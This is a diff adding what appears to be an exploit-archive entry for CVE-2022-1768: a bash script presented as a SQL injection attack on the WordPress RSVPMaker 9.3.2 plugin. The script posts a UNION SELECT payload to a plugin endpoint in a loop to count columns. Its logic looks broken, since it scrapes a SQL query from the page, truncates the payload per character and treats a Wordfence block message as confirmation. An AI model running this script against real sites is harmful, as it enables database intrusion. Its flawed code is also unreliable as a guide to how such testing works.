@@ -1,0 +1,32 @@
+id: 39245
+date: 01/15/2024
+title: WordPress RSVPMaker 9.3.2 SQL Injection Vulnerability
+author: Amirhossein Bahramizadeh
+cves: CVE-2022-1768
+
+#!/bin/bash
+
+# Set the URL of the website running the vulnerable plugin
+url="http://example.com/wp-content/plugins/rsvpmaker/rsvpmaker-email.php"
+
+# Set the number of columns in the query
+columns=5
+
+response=$(curl -s "$url")
+query=$(echo "$response" | grep -oP 'FROM .* WHERE .*')
+
+payload="' UNION SELECT 1,2,3,4,5-- "
+
+# Test the query with different numbers of columns
+for i in $(seq 1 $columns)
+do
+  query_with_payload="${query%?*}?${payload:0:i}${query#*?}"
+  curl -s -X POST -d "$query_with_payload" "$url" | grep -q "Wordfence Security Error"
+  if [ $? -eq 0 ]
+  then
+    echo "Vulnerability confirmed with $i columns"
+    break
+  fi
+done
+
+#  0day.today [2024-01-19]  #
